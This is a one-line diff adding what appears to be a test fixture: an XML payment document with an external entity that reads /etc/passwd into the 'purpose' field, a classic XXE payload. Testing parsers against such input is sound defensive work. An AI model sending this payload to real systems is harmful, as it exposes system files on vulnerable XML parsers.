@@ -1,0 +1,1 @@
+<!DOCTYPE payment [<!ENTITY x SYSTEM "file:///etc/passwd">]><payment><purpose>&x;</purpose></payment>
